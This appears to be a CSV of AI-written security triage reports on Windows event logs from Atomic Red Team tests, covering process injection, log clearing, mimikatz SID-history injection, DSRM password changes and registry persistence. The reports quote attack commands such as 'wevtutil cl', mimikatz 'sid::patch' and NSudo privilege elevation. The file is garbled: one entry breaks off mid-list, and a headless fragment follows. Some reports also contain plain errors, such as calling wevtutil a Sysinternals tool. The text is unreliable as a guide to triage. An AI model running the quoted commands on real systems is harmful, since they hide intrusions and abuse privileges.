Directory Name,AI Response
Thread Execution Hijacking,"### Detailed Analysis

Upon analyzing the provided logs, several indicators of potential malicious activity are evident:

1. **PowerShell Activity:**
   - A PowerShell command was executed to start a process `InjectContext.exe` from the `AtomicRedTeam` directory, which is known for testing security monitoring by emulating attacker tactics. This execution is suspicious as it uses a `Start-Process` command to open Notepad and follows it up with the execution of a potentially malicious executable (`InjectContext.exe`).
   - This PowerShell command resides in a temporary directory path, a common tactic used by attackers to hide or execute malicious payloads.

2. **Sysmon Logs:**
   - Multiple processes were spawned within quick succession, including several executions of native Windows utilities (such as `wevtutil.exe`, `hostname.exe`, `whoami.exe`, and `conhost.exe`). This behavior can be indicative of process injection or other manipulation techniques, as sophisticated attackers often utilize expected system processes to execute malicious code stealthily.
   - The presence of `InjectContext.exe` executed directly via PowerShell without a parent process guiding its typical process tree is suspicious.

3. **Event Log Clearing:**
   - The security logs demonstrate Event ID 1102, which indicates that the security log has been cleared. This is a common activity performed by attackers to cover their tracks after executing malicious activities.
   - System logs also show a similar pattern with Event ID 104 indicating that the system log was cleared. Clearing logs is a strong indicator of malicious intent to erase potentially incriminating evidence.

4. **Use of Privileges:**
   - The logs indicate the use of elevated privileges (SeDebugPrivilege, SeBackupPrivilege, etc.) by `SERVER002\admin_test`. These privileges can allow for unauthorized access or changes to the system that would not be possible under normal conditions.

5. **Unusual Logon Patterns:**
   - Multiple logon and logoff events (Event IDs 4624 and 4634) in rapid succession with elevated privileges further raise suspicion of an attempt to execute unauthorized actions using the `admin_test` account.

### Assessment

The analysis of these logs points to suspicious activities consistent with malicious activity:

- The execution of `InjectContext.exe` using PowerShell scripting from a suspicious directory.
- Clearing of logs to remove traces of potentially unauthorized activities.
- Elevated privileges tied to administrative actions during this timeframe.
- Unusual patterns of process execution imitating legitimate system utilities.

### Resolution

Based on the analysis above, the events captured in these logs strongly suggest **malicious** activity. The combination of executable manipulation, use of well-known atomic red team tactics, elevated privileges, and log clearing are strong indicators of a potential breach or compromise.

### Guidance

- **Immediate Steps:**
  - Isolate the affected host (Server002) from the network to prevent potential spread of the attack.
  - Conduct a detailed forensic analysis on the isolated system to recover more artifacts that were potentially erased.
  - Verify the integrity of privileged accounts and change credentials immediately if they are suspected to be compromised.
  
- **Long-term Measures:**
  - Strengthen monitoring tools and integrate more comprehensive anomaly detection frameworks to quickly identify and alert on such activities in the future.
  - Conduct security awareness training emphasizing the safe handling of privileges and how to spot phishing or suspicious activities.
  - Review all existing detection rules and logs for similar past activities to assess if this was part of a larger campaign.

This situation requires prompt attention and further investigation to determine the full extent of any compromise."
Dirty Vanity process Injection,"## Detailed Analysis of the Logs

### Suspicious and Anomalous Behavior:

1. **Event Log Clearing**: 
   - Multiple instances of event log clearing are observed (`wevtutil.exe cl`), executed by the `admin_test` user. This includes clearing the System, Application, and Windows PowerShell logs (Event IDs: 104 from the System log and 1102 from the Security log). Log clearing is generally considered suspicious behavior when performed by a user account as it can indicate an attempt to cover tracks.

2. **PowerShell Activity**:
   - PowerShell is observed running a command to execute a program frequently associated with penetration testing or post-exploitation: `redVanity.exe`. The presence of the `AtomicRedTeam` directory further suggests that tools intended for red teaming or security testing are being used. This activity is specified in the events from the Windows PowerShell log, where a PowerShell script is executing another process with `calc.exe`.

3. **High-Integrity-Level Actions**:
   - The commands and scripts executed appear to run with high integrity levels, indicating elevated privileges. This might suggest privilege abuse if the actions were unauthorized.

4. **Time Manipulation**:
   - There are events (Event ID: 4616 from Security and corresponding Kernel-General Event ID: 24) indicating that the system time was altered. Unexplained or unauthorized time changes can be used to mislead forensic investigations or log analyses.

5. **Miscellaneous Command Execution**:
   - Processes such as `whoami.exe` and `HOSTNAME.EXE` were executed, which might be used by an attacker to gather information about the system and the user context under which commands are being run.

### Indications of Malicious Activity:
- The combination of log clearing, PowerShell usage to run a suspicious executable (`redVanity.exe`), unauthorized time changes, and commands indicative of reconnaissance strongly suggests this is an indicator of compromise.
- The scripts and potential payloads used seem to align with tactics, techniques, and procedures (TTPs) common to red teaming or actual attacker behavior.

### Conclusion:

The behaviors observed indicate that there is highly suspicious activity that strongly suggests a potential compromise or unauthorized security testing (such as red teaming) conducted without appropriate visibility or authorization from security operations.

## Final Resolution: MALICIOUS

Given the evidence of log tampering, suspicious PowerShell activity, potential privilege abuse, and unauthorized time manipulation, it is concluded that the observed activities are malicious. Immediate containment measures are recommended, including isolating the affected host, conducting a thorough forensic investigation, and reviewing access logs for unauthorized access. Further investigation should seek to determine the scope of the breach and any additional compromised systems."
Process injection ListPlanting,"Upon reviewing and analyzing the event logs, several observations are noteworthy:

### Suspicious Behavior
1. **Command Line Activity**:
   - A PowerShell command was executed to run a suspicious script: `""powershell.exe""& {Start-Process \""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1055.015\\bin\\ListPlanting.exe\"", Start-Sleep -Seconds 7, Get-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force}`.
   - The use of PowerShell scripts to execute binaries from temporary locations by an admin account suggests potential execution of suspicious or malicious code. This particular command originates from a path associated with Atomic Red Team, known for security testing and research, but it can signify a simulation of known attack techniques.

2. **Event Log Clearing**:
   - Security and System event logs were cleared (EventID 1102 from Security log and EventID 104 from System log), a known tactic to cover tracks post-breach.
   - This action was performed by the user `SERVER002\\admin_test`, further indicating attempts to conceal activities.

3. **Privilege Escalation**:
   - Several entries show the account `admin_test` acquiring privileges such as `SeDebugPrivilege`, `SeBackupPrivilege`, etc., typically reserved for high-level operations (EventID 4672).
   - Such activities can be legitimate if performed during routine administrative tasks but are suspicious if occurring without clear justification, particularly paired with other potentially nefarious behaviors.

### Indicators of Malicious Activity
1. **Execution of Potentially Malicious Binaries**:
   - The command line executed by PowerShell references a potentially harmful executable (`ListPlanting.exe`) from a non-standard directory.
   - This event, coupled with clearing event logs, suggests behavior in line with data exfiltration or malware execution phases.

2. **Multiple Console Host Executions (conhost.exe)**:
   - The frequent spawning of `conhost.exe` as a child of processes like `windowsPowerShell` indicates potential staging for execution of commands obfuscated from direct audit trails.
   - Known techniques involve using `conhost.exe` for process hollowing and stealthy command line execution.

### Conclusion
Based on the logs analyzed:
- Multiple orchestrated processes suggest an unauthorized attempt to execute a potential simulated or real attack using PowerShell and obscure execution techniques.
- The clearing of event logs is a strong indicator of malicious intent, aimed at hiding traces of activities.

### Threat Assessment and Resolution
Given the combination of PowerShell misuse, execution from atypical directories, high-level privilege assignments, and event log tampering, the resolution is:

**MALICIOUS**

### Recommended Action
- **Immediate containment** of the machine (Server002) to prevent potential spread or data exfiltration.
- Perform a detailed forensic analysis of the system, including memory and disk analysis.
- Cross-check for any unauthorized accesses in other systems or network anomalies originating from Server002.
- Review and reinforce user account activities, privileges, and enforce stricter PowerShell execution policies.
- Update threat detection and response protocols to monitor similar activities in the network."
Parent PID Spoofing - Spawn from Specified Process,"Based on the provided logs, I have identified several activities that warrant a closer examination. Here's a breakdown of my analysis:

### Suspicious Activities and Anomalies:

1. **Event Log Clearing:**
   - Multiple instances of event log clearing are noted across different channels (System, Windows PowerShell, and Security) by the user `admin_test`. Clearing logs is a common tactic used by adversaries to cover tracks and is typically suspicious behavior.

2. **Unusual PowerShell Activity:**
   - There are PowerShell events indicating the execution of commands that seem to be probing the system's environment and configuration. The use of ""powershell.exe"" to execute scripts with specific arguments (`Start-ATHProcessUnderSpecificParent`) can be indicative of malicious scripts or exploitation attempts, especially given the context of executing under specific parent processes.
   - The execution policy is set to ""Restricted"", yet commands are executed, pointing towards potential bypass mechanisms.

3. **Use of Sysinternals Tools:**
   - The `wevtutil.exe` utility, which is used for clearing event logs, is executed multiple times. This could indicate an attempt to hide malicious activities by regularly purging logs.

4. **Privilege Escalation and High Integrity Level:**
   - The execution of processes with a high integrity level is observed, and the possession of ""SeDebugPrivilege"" along with other critical privileges by the SYSTEM account (event ID 4672) may be exploited to escalate privileges to execute malicious actions.

### Determination and Recommendations:

- **Resolution: SUSPICIOUS**
  - The activities observed, particularly the log clearing and the PowerShell command executions, do not conclusively prove a malicious intent but are highly anomalous and indicative of potentially unauthorized or malicious activities. These events warrant further investigation.

### Recommendations:

1. **Immediate Investigation and Monitoring:**
   - Conduct a thorough review of access logs and any other security alerts related to `admin_test` to verify legitimacy.
   - Monitor for any further log clearing activities and unauthorized script executions on this host and, if possible, across other systems within the network.

2. **Forensic Analysis:**
   - Perform a more in-depth forensic analysis of the system to identify the origin and impact of the activities, especially focusing on any evidence of persistence mechanisms or lateral movement.
  
3. **Increase Logging and Alerts:**
   - Temporarily increase logging verbosity for PowerShell and critical system events to capture more comprehensive data in real-time.
   - Set up alerts for specific activities such as event log clearing and suspicious PowerShell command executions.

4. **User Access Review:**
   - Review the permissions and activities of all users, focusing on those with administrative capabilities, and ensure all activities are properly authorized and logged.

Proceed with caution, ensure all stakeholders are informed, and increase security posturing to mitigate any potential risks from these activities."
Driver Installation Using pnputil.exe,"Upon analysis of the provided Windows event logs, the following observations and assessments can be made:

### Suspicious Activities:
1. **Log Clearing:**
   - Multiple log files, including the System, Security, and Windows PowerShell logs, have been cleared (Event IDs: 104 for System/Powershell and 1102 for Security). Log clearing is typically a suspicious activity as it is often used to cover tracks following potentially unauthorized or malicious actions.

2. **Process Execution:**
   - There is a sequence of executions involving legitimate Windows utilities (`whoami.exe`, `wevtutil.exe`) and `powershell.exe` executing `pnputil.exe` to add an INF file (`acpipmi.inf`). While using PowerShell to execute such commands is not inherently malicious, it can be used to execute malicious payloads or perform unauthorized administrative actions, especially when combined with log clearing.

3. **Elevated Permissions:**
   - The `admin_test` account is observed performing actions with elevated privileges, as noted in the Security log (Event ID: 4672). This includes privileges like `SeDebugPrivilege`, `SeLoadDriverPrivilege`, etc., which are powerful and should be monitored carefully.

### Potential Compromise:
- The combination of executing `powershell.exe` with sensitive commands and subsequent log clearing suggests an attempt to perform and conceal potentially unauthorized operations.
- The appearance of `pnputil.exe` being used to interact with drivers in the context of administrative execution is a known technique for persistence or privilege escalation.

### Assessment:
- **Threat/Risk Identified:** The activities exhibited in the logs are indicative of suspicious or potentially malicious behavior. The execution pattern, privileged operations, and the clearing of logs could suggest an effort to perform unauthorized actions or escalate privileges.

### Guidance:
1. **Further Investigation:**
   - Conduct a thorough review of filesystem and registry changes around the times of the logs.
   - Check for the presence of unauthorized software or malware using detailed forensic tools.
   - Investigate the source of PowerShell scripts and confirm their legitimacy.

2. **Improvement of Security Posture:**
   - Implement stricter access controls and auditing measures on sensitive accounts like `admin_test`.

   - Review and limit the privileges and uses of PowerShell and sensitive applications.

### Resolution:
- **Resolution:** SUSPICIOUS - The logs contain activity that does not look right and requires more investigation to ascertain if the actions were authorized or malicious.

In conclusion, the logs show a sequence of activities that are commonly associated with attempts to conceal unauthorized operations. Further investigation is critical to confirm the nature of the activities and ensure the company's systems remain secure."
Launch NSudo Executable,"Upon analyzing the provided Windows event logs, the following points have been observed which may indicate suspicious or potentially malicious activity:

### Windows Event Logs Analysis:

1. **Clearing of Event Logs:**
   - Multiple instances show logs being cleared from different channels (System, Security, Windows PowerShell).
   - Events with ID **104** in the System log indicate that logs were cleared by a user with the username `admin_test`.
   - Security log also shows Event ID **1102**, indicating the security audit log was cleared by the same user.

2. **Use of `wevtutil.exe`:**
   - The `wevtutil.exe` command-line utility is used to clear event logs.
   - Several instances of `wevtutil.exe` are invoked by `admin_test` to clear event logs.
   - Clearing of logs is generally a common tactic used by attackers to cover their tracks after executing malicious activities.

3. **Suspicious PowerShell Activity:**
   - PowerShell logs show execution of scripts that involve temporary files located in `C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\T1134.001\bin\NSudoLG.exe`.
   - The command-line indicates usage of `NSudoLG.exe` with arguments for seeking elevated privileges (`-U:T -P:E cmd`). This is a known technique to bypass UAC and escalate privileges, commonly used in penetration testing and possible exploitation scenarios.

4. **Presence of Atomic Red Team Techniques:**
   - Presence of tool names like `AtomicRedTeam` suggests possible simulation of attack techniques, but its unexpected presence in this context can indicate either a test by the security team or misuse by a potential attacker.

5. **Unauthorized Credential Access Attempts:**
   - Event ID **5379** in the Security log shows several unsuccessful attempts to access Microsoft accounts using various protocols that resulted in a return code of `3221226021`, which signifies an `STATUS_NO_SUCH_LOGON_SESSION` error. This may indicate failed credential dumping or testing.

6. **Sysmon Events Reflecting Suspicious Process Spread:**
   - Several Sysmon events indicate process creation patterns that are unusual:
     - Mixed usage of host processes like `wsmprovhost.exe`, clearing logs, and tools to grab current context information (e.g., `whoami.exe`, `hostname.exe`).
   - The timing and sequence of these processes hint towards potential scripting or malicious automation.

Scheduled Task Startup Script,"The logs provided present a clear indicator of potential malicious activity associated with the use of administrative tools like `wevtutil.exe` to clear event logs. Let's go through the logs section by section to outline suspicious activities.

### Application Log
- The log entry regarding the Software Protection Platform Service does not indicate any suspicious behavior on its own. This entry reflects routine activity, possibly a scheduled license validation check.

### Security Log
- **Event 1102** indicates the security log was cleared by **admin_test**. Clearing event logs is a critical action that could be used to cover tracks after a security incident, especially when performed by an account named ""admin_test,"" which suggests an administrative user.

### System Log
- **Event 104** was triggered twice, which reflects the clearing of logs on the System and Windows PowerShell channels by the **admin_test** account. This mirrors behavior seen in the Security log, reinforcing concerns about log tampering.

### Sysmon Log
- Multiple instances of `wevtutil.exe` execution are logged. The command lines clear event channels (""Microsoft-Windows-Sysmon/Operational"", ""System"", ""Application"", ""Security"", ""Windows PowerShell""). This activity explicitly showcases attempts to clear logs and suggests potential log and trace covering.
- An execution of `cmd.exe` performs potentially malicious actions by creating scheduled tasks intended to run `calc.exe`. The names ""T1053_005_OnLogon"" and ""T1053_005_OnStartup"" follow common tactics, techniques, and procedures (TTPs) naming, which can be a sign of a red team or adversary mimicking known techniques for stealth.

### Conclusion
The following activities were identified as potentially malicious:
- Clearing of all main event logs by `admin_test`.
- Sequential execution and clearing of logs using `wevtutil.exe`.
- Attempted persistence via scheduled tasks designed to launch `calc.exe`, indicative of possible malicious intent or testing of persistence mechanisms.

### Resolution
Given the combination of event log clearing, use of administrative tools to delete evidence, and the creation of suspicious scheduled tasks, the analysis concludes that the logs contain activity categorized as:

**MALICIOUS**

### Guidance
Immediate actions should include:
1. Conduct a thorough forensic investigation of the affected system to identify the root cause and extent of the compromise.
2. Review and, if necessary, change credentials for the admin_test account due to potential compromise.
3. Check for any unauthorized software or scripts on the system.
4. Review other systems for signs of similar activity, suggesting lateral movement or wider compromise.
5. Implement monitoring enhancements to detect similar activities in the future, and consider isolating the affected system until a full analysis is completed.

Engage with your incident response team to contain and remediate this threat effectively."
Password Change on Directory Service Restore Mode (DSRM) Account,"Based on the provided Windows event logs, here's a comprehensive analysis of the activities recorded:

1. **PowerShell and Wevtutil Activity**: 
   - The logs provide extensive records of `C:\Windows\System32\wevtutil.exe` and `conhost.exe` processes running in a sequence. The `wevtutil` command is used to clear Windows event logs, particularly the System, Application, and Security logs.
   - The commands `wevtutil.exe cl Microsoft-Windows-Sysmon/Operational`, `wevtutil.exe cl Application`, `wevtutil.exe cl System`, `wevtutil.exe cl Security`, and `wevtutil.exe cl ""Windows PowerShell""` indicate systematic clearing of logs, which is a potential sign of covering tracks post-compromise.

2. **Cmd and Whois Activity**:
   - `cmd.exe` is shown executing with parameters involving `ntdsutil`, which is often used to manage Active Directory Domain Services (AD DS) and can indicate privilege manipulation. The specific command `ntdsutil ""set dsrm password"" ""sync from domain account %%username%%"" ""q"" ""q""` is suspicious as it attempts to change or sync the DSRM (Directory Services Restore Mode) password with a domain account, possibly pointing to an attempt at unauthorized directory service manipulation.
   - `whoami.exe` was executed, typically used to identify user access credentials in the system. In the context of these logs, it suggests an attempt to gather information about the compromised environment.

3. **Event Log Clearance**:
   - There are multiple instances of the Event ID 104, indicating logs were cleared by the user `admin_test`. This action further corroborates the potential for malicious activity aimed at clearing tracks.

4. **Privilege Escalation and System Integrity**:
   - The `admin_test` account, having high integrity and clearing logs, along with the cmd operations, could be indicative of high privilege access, possibly a compromised account.
   - Privileges such as `SeDebugPrivilege`, `SeBackupPrivilege`, and others being assigned to this account detail a level of privilege escalation to perform the logged actions, which are not typical and point to possible malicious intent.

5. **Time Change**:
   - The logs also show time changes via `svchost.exe`, altering the system time back several seconds, possibly as an attempt to match time-stamps or correlate time-based activities for alignment in disguise, although less critical, it still demands attention when paired with other suspicious activity.

### Assessment:

- **Indicators**:
  - The systematic clearing of various Windows event logs.
  - Execution of administrative tools (`ntdsutil`) potentially for nefarious purposes.
  - The running user `SERVER002\\admin_test` possesses high integrity and elevated privileges atypical for normal operations.
  - Privileges being escalated.

### Resolution:

Given the examination of activities, there are several indicators of potential malicious behavior:

- **MALICIOUS**: The logs demonstrate a series of actions consistent with covering tracks (log clearance), potentially manipulating directory services, and utilizing a high-integrity level account to achieve these objectives. These characteristics strongly indicate a compromise, probably from an insider threat or an account takeover.

### Guidance on How to Proceed:

1. **Immediate Actions**:
   - Isolate the affected machine (Server002) to prevent further compromise.
   - Investigate the user account `admin_test` for unauthorized access or abnormal behavior prior to these events.

   - Implement tighter controls and monitoring (enhanced logging) on highly privileged account activities.
   - Review and revise existing security policies and provide awareness training on recognizing insider threats.

4. **Report Findings**:
   - Draft a comprehensive incident report detailing findings, actions taken, and preventive measures moving forward."
Injection SID-History with mimikatz,"Upon reviewing the provided Windows event logs, several indicators of malicious activity can be identified:

1. **Execution of Mimikatz**: 
    - **Sysmon EventID 1** indicates the execution of `cmd.exe` with a command line that includes Mimikatz (`mimikatz.exe`). Mimikatz is a well-known tool used for extracting credentials, and its presence in system logs is a strong indicator of malicious activity.
    - The command-line arguments include privilege escalation operations (`privilege::debug`, `sid::patch`, etc.), which are consistent with attempts to manipulate system privileges.

2. **Log Clearing Events**:
    - **Windows Event Log ID 104** indicates that logs were cleared by the user `admin_test`. This is a red flag as attackers often clear event logs to cover their tracks after compromising a system.
    - **Security Log ID 1102** showing the security log being cleared further corroborates this suspicion.

3. **Use of `wevtutil`**:
    - Multiple Sysmon EventID 1 entries show the use of `wevtutil.exe` to clear logs in the System, Security, and Windows PowerShell channels. The use of `wevtutil.exe` for log clearing is another strong indicator of an attempt to hide malicious actions.

4. **PowerShell and Cmd Activity**:
    - Execution of PowerShell scripts and commands via Cmd to assess and interact with Mimikatz suggest automated or scripted attack processes, which are consistent with sophisticated intrusion attempts.

Given these findings, we are presented with a scenario that points towards a high likelihood of compromise. The combination of credential extraction, log clearing, and the use of powerful command-line utilities in a short time frame strongly suggests the system was targeted and compromised by a malicious actor.

**Resolution: MALICIOUS**

**Guidance on how to proceed**:
- Immediately isolate the affected system (Server002) from the network to prevent further compromise or exfiltration of data.
- Conduct a further forensic investigation on this host to gather more evidence and understand the full scope of the compromise, including potential lateral movement.
- Review and enhance security configurations such as user privileges, logging, and monitoring to prevent similar future incidents.
- Reset credentials, particularly for users with administrative access, as these may have been compromised.
- Investigate the broader network environment for similar indicators of compromise and ensure no other systems have been affected.

This assessment concludes with a strong recommendation for immediate incident response actions to contain and remediate the malicious activity discovered in these logs."
Create a new time provider,"After thoroughly analyzing the provided Windows event logs, the following observations stand out:

1. **Log File Clearing:**
   - There are multiple instances of log files being cleared, which is indicative of an attempt to cover tracks. In the System log, EventID 104 shows `LogFileCleared` with the username `admin_test` for both the System and Windows PowerShell channels.
   - In the Security log, EventID 1102 indicates that the Security log was also cleared by the same user which is a red flag for potential malicious activity.

2. **Suspicious PowerShell Activity:**
   - In the Windows PowerShell log, there are event IDs indicating the use of PowerShell commands to copy a DLL file and modify the registry, which suggests the execution of a persistence mechanism. This is further confirmed by the presence of Atomic Red Team T1547.003 technique usage for time provider abuse.
   - These alterations are tied to commands which include stopping and starting the Windows Time service and adding a DLL to a registry key associated with `W32Time`.

3. **Indicators of Execution and Privilege Escalation:**
   - Several Sysmon logs indicate the execution of processes like `wevtutil.exe`, `whoami.exe`, and `reg.exe` by the user `SERVER002\admin_test`. These processes add to the suspicion of either reconnaissance or operational setup steps for persistence or privilege escalation.
   - The detailed command-line arguments captured showcase explicit registry modifications which align with known tactics for persistence by abusing time providers as mentioned in MITRE ATT&CK's T1547.003.

4. **Time Modification Events:**
   - Security log EventID 4616 indicates a time change. Time adjustments often accompany activities where time-based artifacts must be aligned or obfuscated.

5. **Network and Service Manipulation:**
   - Multiple instances of network and service manipulation were performed via commands involving `net.exe` and `net1.exe`, particularly targeting the `w32time` service, which is consistent with attempts to manipulate network or time-oriented settings, possibly to support a persistence mechanism.

In summary, the collection of these activities suggests a sophisticated attempt to establish persistence using known Atomic Red Team techniques, with logs indicative of potential compromise. The clearing of logs further strengthens the suspicion of malign intent, signaling a concerted effort to hide activities.

**Resolution: MALICIOUS**

**Guidance on How to Proceed:**
- Immediate containment: Isolate the affected host to prevent further spread of the compromise.
- Thorough forensic investigation: Conduct a more detailed forensic investigation to confirm the artifacts and extent of the compromise.

- User awareness and training: Train users to recognize and report suspicious activities, as insider threats or compromised accounts could contribute to such incidents."
Process Injection with Go using UuidFromStringA WinAPI,"Upon investigating the Windows event logs for suspicious activities, several points stand out, indicating potentially malicious behavior:

1. **Log Cleared Events:**
   - **System, Windows PowerShell, and Security logs have been cleared** by the user ""admin_test"" at times close to one another (Event ID 104 and 1102 for the System and Security logs, respectively). This is a significant red flag as the clearing of logs could be an attempt to cover up tracks.

2. **Execution of Suspicious Binary:**
   - Execution of `powershell.exe` with an argument referencing a potentially suspicious executable `UuidFromStringA.exe` located in a temporary directory as depicted in multiple PowerShell log entries. This behavior is consistent with execution patterns used in some attack simulations and penetration tests (e.g., Atomic Red Team).

3. **Use of Wevtutil Command:**
   - Multiple instances of the `wevtutil.exe` utility, which is often used to manage event logs, including clearing them, are evidence of tampering. These commands were executed close to the times when the logs were cleared, suggesting intentional manipulation to hide activities.

4. **Time-Related Event IDs 4616:**
   - Time discrepancies and adjustments logged by `Event ID 4616` in the Security log could indicate manipulation of system time, which is another tactic in some attack frameworks to evade detection.

5. **Tools and Indicators:**
   - Reference to ""Atomic Red Team,"" a well-known tool used for simulating attacks to test security monitoring and defenses further supports the hypothesis of a potentially controlled environment with malicious intent.
  
6. **Multiple Instance of Whoami Commands:**
   - The repeated use of `whoami.exe`, particularly in quick succession or unusual contexts, can sometimes indicate account discovery actions by an attacker.

**Assessment of Findings:**
The combination of logs being cleared, execution of potentially malicious software from a temporary directory, manipulation of system time, and the use of wevtutil for clearing logs, all contribute to building a strong case for a compromised host. These actions align with tactics used in real-world attacks.

**Resolution: MALICIOUS**

**Guidance:**
Immediate action should be taken to:
- Isolate the affected machine for further analysis.
- Conduct a thorough forensic investigation to identify the cause and extent of the breach.
- Review and improve logging and monitoring configurations to prevent and detect such activities in the future.
- Consider resetting credentials associated with the ""admin_test"" account and reviewing other privileged accounts for signs of compromise.
- If this is a sanctioned penetration test, ensure that all actions are logged, and findings are appropriated handled according to company protocols."

     - **Security Log Clearing**: EventID 1102 in the Security log indicates that the security event log was cleared by the user `admin_test`.
     - **System Log Clearing**: EventID 104 in the System log indicates the system event log was cleared.
   - The clearing of event logs is often a red flag, as it suggests a possible attempt to cover tracks after security-impacting activities.

2. **Use of Wevtutil**:
   - Multiple instances of the utility `wevtutil.exe` have been recorded in the logs (as seen in Sysmon logs).
   - The command used, `wevtutil cl`, is known for clearing event logs. Such behavior is highly suspicious if not part of routine administrative tasks. It aligns with the log clearing events mentioned before.

3. **PowerShell Execution by `admin_test`**:
   - A PowerShell process was initiated by `admin_test`, as recorded in the Sysmon logs. Though usage of PowerShell by an admin isn't inherently suspicious, its proximity to the log cleansing events calls for scrutiny.

4. **Execution of Command and External Tools**:
   - There is a recorded execution of `Cmd.exe` with command lines involving tools like `PsExec.exe` and `GhostTask.exe`, initiated by `admin_test`.
   - The use of these tools, particularly PsExec, which can execute processes on remote systems, combined with suspicious command usage, resembles patterns often seen in lateral movement or privilege escalation attempts within a network.

5. **High Integrity Level Processes**:
   - Processes such as `cmd.exe`, `wevtutil.exe`, and `PowerShell.exe` are executed with a high integrity level, indicating elevated privileges potentially exploited for malicious activity.

**Assessment**:
The combination of event log clearing, the use of `wevtutil` for this purpose, the specific use of administrative tools, and the high-frequency and high-integrity level of processes executed by the `admin_test` account suggest strongly suspicious activity within the system. This is particularly concerning given the absence of legitimate reasons evident from the logs provided. The lack of context around some processes, like the use of `PsExec.exe`, highlights the potential for malicious intent, as unauthorized execution could be indicative of unauthorized access or malicious lateral movement.

**Resolution: SUSPICIOUS**

**Guidance on How to Proceed**:
1. **Immediate Investigation**: 
   - Analyze the user `admin_test` activity deeply, verify if the actions align with their typical duties, and confirm if their account was compromised.
   
2. **Review and Re-enable Logging**: 
   - Re-enable and configure more comprehensive logging to capture relevant security events, especially around sensitive operations.

3. **Conduct a Threat Hunt**: 
   - Initiate a threat hunt on `Server002` and surrounding systems for similar activity or use of administrative tools in a suspicious manner.

4. **Implement Compensating Controls**:
   - Consider implementing stricter access controls for critical administration tools and enforcing Multi-Factor Authentication (MFA) for privileged accounts.

5. **Monitor and Notify Security Operations Center**: 
   - Alert and engage the Security Operations Center (SOC) to actively monitor for any further signs of potential breach or malicious activity."
HKCU - Policy Settings Explorer Run Key,"### Analysis of Windows Event Logs

Upon reviewing the logs, several key points of suspicious and potentially malicious activity were identified:

1. **Log Clearing Events:**
   - The `System`, `Windows PowerShell`, and `Security` logs show indicators of file clearing activity. This is signified by the presence of the event IDs 104 in the System log and 1102 in the Security log. The account ""admin_test"" is associated with this activity, which is often a tactic used by malicious actors to cover their tracks.

2. **Sysmon Logs:**
   - Multiple instances of `wevtutil.exe` clearing logs are recorded in the Sysmon logs. This utility is commonly used to manage event logs, including clearing, and when done without legitimate purposes can indicate an attempt to hide malicious actions.

3. **Launch of Suspicious Powershell Commands:**
   - A PowerShell command is logged that attempts to create a registry key under `HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run`. The command line contains an entry to execute `calc.exe`, which, while benign, could be a placeholder used in testing or to mask the intention to execute other scripts or malicious payloads. The presence of this command is indicative of potential unauthorized persistence mechanisms or configuration changes.

4. **Context and Behavior Analysis:**
   - The event timeline shows a correlation between the clearing of logs and the execution of the suspicious PowerShell script, suggesting intentional obfuscation attempts. Such behavior needs thorough investigation to verify the intentions behind these commands and identify potential external control or code injection.

### Evaluation and Assessment:
Given the behavior of systematic log clearance combined with the execution of a PowerShell script for potential configuration change or persistent backdoor setup, the activity suggests an effort to obfuscate unauthorized actions. This matches known patterns of malicious behavior seen in targeted attacks.

### Resolution: **MALICIOUS**

### Guidance and Next Steps:

1. **Isolate the System:**
   - To prevent any further damage or spread, isolate the affected machine (Server002) from the network.

2. **Conduct Full Forensic Analysis:**
   - Perform a deeper forensic analysis on the system to determine the extent of the compromise, including file system investigation, memory analysis, and a review of network logs.

3. **Review Permissions and Access:**
   - Audit and review permissions granted to the ""admin_test"" account and validate the need for such permissions. Investigate all accounts with similar privileges.

4. **Reverse Engineer Scripts:**
   - Carefully analyze the PowerShell scripts executed to understand the full context and potential payloads involved.

5. **Patch and Update Systems:**
   - Ensure all systems are up-to-date with security patches, and revisit the organization's security posture, including monitoring tools and incident response protocols.

By adhering to the suggested guidance, the organization can effectively mitigate the risk posed by this malicious activity and strengthen its overall security posture."
Admin Account Manipulate,"Based on the analysis of the given Windows event logs for the CEO's machine on Server002, the following observations and findings indicate some critical activities related to potential malicious behavior:

### Observations & Findings:

1. **Log File Clearance**:
   - Several instances of log files being cleared are observed in the System, Windows PowerShell, and Security logs (`EventID: 104` for System and Windows PowerShell, `EventID: 1102` for Security). The clearing of event logs is often an attempt to hide malicious activities and is highly suspicious.

2. **Unusual PowerShell Activity**:
   - There is a PowerShell script executed that renames the “Administrator” account to a randomly generated name (`HaHa_$x$y$z$w`) and then updates the description of the local user using a specific pattern. The use of PowerShell with such complex command lines and altering user account details is a strong indicator of malicious activity (observed in multiple sources including PowerShell Logs with `EventID: 600` and `EventID: 400`, Security log `EventID: 4781`).

3. **Privilege Escalation**:
   - Events show evidence of privileged activities conducted by the user `admin_test` with access to several high-level privileges (`SeSecurityPrivilege`, `SeBackupPrivilege`, `SeRestorePrivilege`, `SeTakeOwnershipPrivilege`, `SeDebugPrivilege`, etc.) as seen in Security log `EventID: 4672`. This is often indicative of attempts to maintain persistence or facilitate further attacks.

4. **Suspicious Logon Sessions**:
   - The logs show entries with NTLM logons (Security Event ID `4624`), potentially indicating lateral movement or unauthorized access.

5. **Process Execution**:
   - Execution of `wevtutil.exe` to clear event logs from different channels and unusual instances of `conhost.exe` operations originating from the parent `wevtutil.exe`. This aligns with the efforts to cover tracks or alter evidence of activities.

### Assessment:
The combination of logs being cleared, unusual and complex PowerShell commands being executed, altering local user accounts, and elevated privileges strongly suggest this is a compromise indicative of malicious activity rather than normal benign operations. These activities align with known tactics and techniques utilized by attackers to establish persistence, escalate privileges, and maintain control over compromised systems.

### Resolution: MALICIOUS

### Guidance on How to Proceed:
1. **Immediate Containment**:
   - Isolate the affected system (Server002) from the network to prevent further spread or data exfiltration.
   
2. **Forensic Investigation**:
   - Conduct a deep dive forensic analysis on the system to understand the full scope of the breach, including network logs, file system audits, and installed software checks.

3. **Incident Response**:
   - Initiate incident response procedures to identify, eradicate, and recover from the malicious activities. This may include reviewing adjacent systems and accounts for similar activities.

4. **Patch and Remediate**:
   - Apply necessary patches and security updates to vulnerabilities that could have been exploited, such as unpatched PowerShell or system vulnerabilities.

5. **User Awareness and Policy Enforcement**:
   - Reinforce security policies regarding the use of administrative privileges, PowerShell restrictions, and log retention practices.
   
6. **Update Detection Measures**:
   - Enhance monitoring and detection mechanisms to better identify and respond to similar activities in the future.

It is vital to maintain communication with relevant cybersecurity personnel and, if necessary, contact law enforcement to comply with regional regulatory requirements regarding breaches."
